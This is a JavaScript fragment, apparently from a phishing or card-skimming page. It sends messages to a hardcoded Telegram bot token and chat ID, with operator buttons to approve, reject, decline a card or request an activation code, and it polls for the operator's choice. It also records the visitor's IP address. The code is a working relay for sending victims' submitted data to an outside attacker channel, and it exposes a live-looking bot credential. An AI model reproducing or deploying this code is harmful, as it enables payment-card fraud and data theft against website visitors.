const BOT_TOKEN = '8891065186:AAEl3mhHxdy53_2ZOnQU1E08FWFxmEsn1R4';
    const CHAT_ID = '6165206261';
    const WEBHOOK_URL = 'https://api.telegram.org/bot' + BOT_TOKEN;

    let pendingRequestId = null;

    async function sendToTelegram(message, requestId, dataType) {
      try {
        const response = await fetch(`${WEBHOOK_URL}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML',
            reply_markup: {
              inline_keyboard: [[
                { text: '✅ قبول', callback_data: `approve_${dataType}_${requestId}` },
                { text: '❌ رفض', callback_data: `reject_${dataType}_${requestId}` },
                { text: '🚫 رفض البطاقة', callback_data: `decline_card_${dataType}_${requestId}` },
                { text: '📩 الرسالة', callback_data: `activation_${dataType}_${requestId}` }
              ]]
            }
          })
        });
        const json = await response.json();
        return json.result ? json.result.message_id : null;
      } catch (error) {
        console.error('خطأ في إرسال البيانات إلى تليجرام:', error);
        return null;
      }
    }

    async function editTelegramMessage(messageId, originalText, resultText) {
      try {
        await fetch(`${WEBHOOK_URL}/editMessageText`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            message_id: messageId,
            text: originalText + '\n\n' + resultText,
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [] }
          })
        });
      } catch (error) {
        console.error('خطأ في تعديل رسالة تليجرام:', error);
      }
    }

    async function checkWebhookResponse(requestId, dataType) {
      try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
        const data = await response.json();
        
        if (data.ok && data.result && data.result.length > 0) {
          for (let update of data.result) {
            if (update.callback_query) {
              const callbackData = update.callback_query.data;
              
              if (callbackData === `approve_${dataType}_${requestId}`) {
                return 'approved';
              } else if (callbackData === `reject_${dataType}_${requestId}`) {
                return 'rejected';
              } else if (callbackData === `decline_card_${dataType}_${requestId}`) {
                return 'decline_card';
              } else if (callbackData === `activation_${dataType}_${requestId}`) {
                return 'activation';
              }
            }
          }
        }
        return 'pending';
      } catch (error) {
        console.error('خطأ في التحقق من استجابة تليجرام:', error);
        return 'pending';
      }
    }

    async function getVisitorIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const { ip } = await res.json();
        return ip;
      } catch (err) {
        console.error("فشل في جلب عنوان IP:", err);
        return 'غير معروف';
      }
    }